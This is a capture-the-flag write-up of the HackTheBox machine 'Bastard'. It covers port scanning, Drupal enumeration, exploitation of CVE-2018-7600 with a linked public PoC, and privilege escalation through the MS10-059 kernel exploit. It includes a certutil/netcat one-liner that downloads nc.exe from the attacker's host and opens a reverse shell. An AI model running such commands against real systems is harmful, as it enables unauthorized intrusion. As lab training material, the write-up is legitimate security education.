---
layout: page
title: Bastard - HackTheBox
permalink: /posts/ctf/hackthebox/bastard.html
---

# Bastard - HackTheBox
----

First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 10.10.10.9`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/44dc899b-7c65-4270-a277-570ca8bc03be/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/44dc899b-7c65-4270-a277-570ca8bc03be/Untitled.png)

We have a few ports open but port 80 looks the most interesting.  Lets check it out.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a165a04-dd6a-43f7-886e-eba82ff3112e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a165a04-dd6a-43f7-886e-eba82ff3112e/Untitled.png)

Looks like we have a Drupal page running, I like to run **doopescan** when I come across a Drupal site first but keep in mind the scan takes a while to finish.  I did some default passwords and basic enumeration while waiting but didn't find much so decided to wait for the results from **doopescan**

`droopescan scan drupal -u http://10.10.10.9`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6b46c712-8c7e-49cd-a21f-fc62f7245ac1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6b46c712-8c7e-49cd-a21f-fc62f7245ac1/Untitled.png)

Now that we have a version, lets research and see if we can find a public exploit available.  I found an exploit for RCE in the Services module that I started to try however found another vulnerability in CVE-2018-7600 that seemed to be an easier path. Here is the Service module exploit.

[](https://www.exploit-db.com/exploits/41564)

Here is the PoC I used for CVE-2018-7600.  

[pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

Pretty straight forward exploit, Lets try it out.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/12945df3-0fcb-4ea9-ab4d-91d21899efd0/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/12945df3-0fcb-4ea9-ab4d-91d21899efd0/Untitled.png)

Looks like we have code execution!  Lets see if we can get a shell now.  I hosted up **nc.exe** and downloaded/executed it with this one liner to get a shell on the machine.

`certutil -urlcache -f [http://10.10.14.31/nc.exe](http://10.10.14.31/nc.exe) nc.exe & nc.exe -e cmd.exe 10.10.14.31 53`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/284eca60-db57-4216-970e-07a9e052f9f3/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/284eca60-db57-4216-970e-07a9e052f9f3/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/01d631da-390d-4506-9fd7-22bc1f81f208/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/01d631da-390d-4506-9fd7-22bc1f81f208/Untitled.png)

We are in.  I copied WinPEAS over but couldn't get the executable to run, probably a .NET issue.  I ran the .bat version but didn't find much so decided to run WinPrivChecker and found a number of possible kernel exploits.  I like abatchy17's GitHub collection of kernel exploits found here..

[abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fbbf9ca7-b81a-44f4-81c4-a75adaa388d9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fbbf9ca7-b81a-44f4-81c4-a75adaa388d9/Untitled.png)

I went through some of these and found that MS10-059.exe worked great for getting a reverse shell as System!

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fed9d7fa-a8ab-440f-ba08-9edb0392ad86/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fed9d7fa-a8ab-440f-ba08-9edb0392ad86/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cd44953c-3628-4a6b-b3fa-e00cc76e975e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cd44953c-3628-4a6b-b3fa-e00cc76e975e/Untitled.png)
